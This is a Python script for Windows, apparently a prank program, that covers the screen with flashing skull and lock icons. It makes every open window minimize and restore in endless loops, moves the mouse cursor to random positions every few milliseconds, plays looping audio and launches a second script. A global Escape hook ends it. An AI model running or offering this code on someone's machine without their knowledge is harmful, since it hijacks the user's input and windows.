import tkinter as tk
import pygame
import random
import win32gui
import keyboard
import win32con
import win32api
import time
import subprocess
import threading
import pyautogui

# Cores para cada ícone
icons_and_colors = [
    ("⚠️", "yellow"), ("💀", "white"), ("🔒", "gray"),
    ("⭕", "red"), ("§", "purple"), ("@", "orange"),
    ("#", "cyan"), ("🛑", "magenta"),
]

# Janela principal invisível com ícones
root = tk.Tk()
root.title("tk")
root.overrideredirect(True)
root.attributes("-topmost", True)
root.attributes("-transparentcolor", "black")
screen_width, screen_height = pyautogui.size()
root.geometry(f"{screen_width}x{screen_height}+0+0")
root.configure(bg="black")

canvas = tk.Canvas(root, bg="black", highlightthickness=0)
canvas.pack(fill="both", expand=True)

# Ícones flutuantes


def espalha_icones():
    x = random.randint(0, screen_width)
    y = random.randint(0, screen_height)
    icon, cor = random.choice(icons_and_colors)
    canvas.create_text(x, y, text=icon, font=("Segoe UI", 30), fill=cor)
    root.after(30, espalha_icones)


espalha_icones()

# Sair com ESC
root.bind("<Escape>", lambda e: root.destroy())

# Mantém a janela dos ícones em fullscreen e visível


def proteger_tk():
    time.sleep(1)
    hwnd_tk = win32gui.FindWindow(None, "tk")
    while True:
        if hwnd_tk and win32gui.IsIconic(hwnd_tk):
            win32gui.ShowWindow(hwnd_tk, win32con.SW_RESTORE)
        win32gui.SetWindowPos(hwnd_tk, win32con.HWND_TOPMOST,
                              0, 0, screen_width, screen_height, 0)
        time.sleep(1)


threading.Thread(target=proteger_tk, daemon=True).start()

# Quicar janelas do sistema (não a de ícones)


def move_window(hwnd):
    if not win32gui.IsWindowVisible(hwnd):
        return
    try:
        # Ignora janela dos ícones
        if win32gui.GetWindowText(hwnd) == "tk":
            return

        mini_w = 300
        mini_h = 150
        x = random.randint(0, screen_width - mini_w)
        y = random.randint(0, screen_height - mini_h)
        dx = random.choice([-10, 10])
        dy = random.choice([-10, 10])

        win32gui.MoveWindow(hwnd, x, y, mini_w, mini_h, True)
        time.sleep(0.2)

        while True:
            x += dx
            y += dy
            if x <= 0 or x + mini_w >= screen_width:
                dx *= -1
            if y <= 0 or y + mini_h >= screen_height:
                dy *= -1
            win32gui.MoveWindow(hwnd, x, y, mini_w, mini_h, True)
            time.sleep(0.02)
    except:
        pass

# Ataca janelas do sistema em loop


def atacar_loop():
    time.sleep(2)
    hwnd_tk = win32gui.FindWindow(None, "tk")

    def callback(hwnd, _):
        if hwnd == hwnd_tk:
            return
        if not win32gui.IsWindowVisible(hwnd):
            return

        try:
            # Ignora fullscreen (maximizada ocupando toda tela)
            rect = win32gui.GetWindowRect(hwnd)
            width = rect[2] - rect[0]
            height = rect[3] - rect[1]
            if width >= screen_width and height >= screen_height:
                return

            # Alterna minimizar e restaurar em loop
            def min_max_loop():
                while True:
                    win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)
                    time.sleep(0.5)
                    win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                    time.sleep(0.5)

            threading.Thread(target=min_max_loop, daemon=True).start()

        except:
            pass

    while True:
        win32gui.EnumWindows(callback, None)
        time.sleep(5)


threading.Thread(target=atacar_loop, daemon=True).start()

screen_width, screen_height = pyautogui.size()


def teleportar_mouse():
    while True:
        x = random.randint(0, screen_width)
        y = random.randint(0, screen_height)
        pyautogui.moveTo(x, y)
        time.sleep(0.005)  # tempo entre teletransportes (super veloz)


# Inicia o teleporte em thread separada
threading.Thread(target=teleportar_mouse, daemon=True).start()


def esc_global():
    keyboard.wait('esc')
    pygame.mixer.music.stop()  # espera pressionar Esc
    root.destroy()        # fecha a janela principal


threading.Thread(target=esc_global, daemon=True).start()

pygame.mixer.init()
pygame.mixer.music.load("solaris.wav")
pygame.mixer.music.play(-1)

subprocess.Popen(["python", "janela.py"])

root.mainloop()
